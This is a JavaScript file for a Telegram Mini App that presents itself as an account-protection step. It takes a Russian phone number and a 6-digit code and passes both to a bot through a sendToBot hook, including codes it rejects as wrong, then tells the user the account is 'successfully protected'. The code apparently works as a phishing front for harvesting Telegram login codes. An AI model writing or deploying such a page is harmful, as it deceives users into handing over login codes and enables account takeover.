document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.setHeaderColor('#060137');
    tg.setBackgroundColor('#060137');
    tg.enableClosingConfirmation();

    // Элементы
    const phoneForm = document.getElementById('phone-form');
    const codeForm = document.getElementById('code-form');
    const phoneInput = document.getElementById('phone');
    const codeInput = document.getElementById('code');
    const phoneError = document.getElementById('phone-error');
    const codeError = document.getElementById('code-error');
    const submitCodeBtn = document.getElementById('submit-code');

    // Состояние приложения
    let currentPhone = '';

    // Анимация загрузки
    const setLoading = (element, isLoading) => {
        element.disabled = isLoading;
        element.innerHTML = isLoading 
            ? '<div class="loader"></div>' 
            : element.dataset.originalText;
    };

    // Сохраняем оригинальный текст кнопки
    submitCodeBtn.dataset.originalText = submitCodeBtn.textContent;

    // Форматирование номера
    const formatPhone = (value) => {
        const numbers = value.replace(/\D/g, '');
        let formatted = '+7';
        
        if (numbers.length > 1) {
            formatted += ' ' + numbers.substring(1, 4);
        }
        if (numbers.length > 4) {
            formatted += ' ' + numbers.substring(4, 7);
        }
        if (numbers.length > 7) {
            formatted += ' ' + numbers.substring(7, 9);
        }
        if (numbers.length > 9) {
            formatted += ' ' + numbers.substring(9, 11);
        }
        
        return formatted.substring(0, 16);
    };

    // Валидация номера
    const validatePhone = (phone) => {
        const clean = phone.replace(/\D/g, '');
        return clean.length === 11 && clean.startsWith('7');
    };

    // Обработчик ввода телефона
    phoneInput.addEventListener('input', (e) => {
        phoneInput.value = formatPhone(e.target.value);
    });

    // Проверка кода (заглушка)
    const verifyCode = async (code) => {
        return new Promise(resolve => {
            setTimeout(() => {
                // В продакшене заменить на реальный API-запрос
                resolve(code === '123456'); // Тестовый код
            }, 1500);
        });
    };

    // Отправка номера
    document.getElementById('submit-phone').addEventListener('click', async () => {
        const phone = phoneInput.value.replace(/\D/g, '');
        
        if (!phone) {
            showError(phoneError, 'Введите номер телефона');
            return;
        }
        
        if (!validatePhone(phone)) {
            showError(phoneError, 'Введите корректный российский номер (+7 XXX XXX XX XX)');
            return;
        }
        
        hideError(phoneError);
        currentPhone = `+${phone}`;
        phoneForm.classList.add('hidden');
        codeForm.classList.remove('hidden');
        
        if (window.sendToBot) {
            await window.sendToBot('phone', currentPhone);
        }
    });

    // Отправка кода
    submitCodeBtn.addEventListener('click', async () => {
        const code = codeInput.value.trim();
        
        if (!/^\d{6}$/.test(code)) {
            showError(codeError, 'Введите ровно 6 цифр');
            return;
        }
        
        hideError(codeError);
        setLoading(submitCodeBtn, true);
        
        const isValid = await verifyCode(code);
        
        if (isValid) {
            if (window.sendToBot) {
                await window.sendToBot('verified', code);
            }
            tg.showAlert('✅ Аккаунт успешно защищен!');
            setTimeout(() => tg.close(), 1000);
        } else {
            showError(codeError, 'Неверный код. Попробуйте снова');
            codeInput.value = '';
            if (window.sendToBot) {
                await window.sendToBot('failed', code);
            }
        }
        
        setLoading(submitCodeBtn, false);
    });

    // Показ ошибки
    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
        element.style.animation = 'shake 0.5s';
        setTimeout(() => element.style.animation = '', 500);
    }

    function hideError(element) {
        element.style.display = 'none';
    }
});